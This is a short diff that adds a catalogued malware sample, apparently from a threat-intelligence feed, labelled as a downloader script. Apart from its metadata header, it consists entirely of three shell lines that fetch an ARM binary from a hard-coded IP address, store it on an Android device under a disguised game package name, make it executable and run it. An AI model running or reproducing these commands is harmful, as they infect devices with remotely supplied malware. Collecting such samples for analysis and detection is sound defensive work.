@@ -1,0 +1,12 @@
+# sha256: bd2b331594c717fefa22b85b6cd57441a1dadbb3c0d1f63c1572a9ed34504dd1
+# family: downloader
+# kind: script
+# size_bytes: 568
+# first_seen: 2026-07-28 16:55:40.451685 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+toybox wget http://94.154.43.48/rebirth.arm7 -O /data/local/tmp/com.supercell.clashroyal; chmod 777 /data/local/tmp/com.supercell.clashroyal; ./data/local/tmp/com.supercell.clashroyal adb;
+busybox wget http://94.154.43.48/rebirth.arm7 -O /data/local/tmp/com.supercell.clashroyal; chmod 777 /data/local/tmp/com.supercell.clashroyal; ./data/local/tmp/com.supercell.clashroyal adb;
+busybox wget http://94.154.43.48/rebirth.arm7 -O /data/local/tmp/com.supercell.clashroyal; chmod 777 /data/local/tmp/com.supercell.clashroyal; ./data/local/tmp/com.supercell.clashroyal adb;
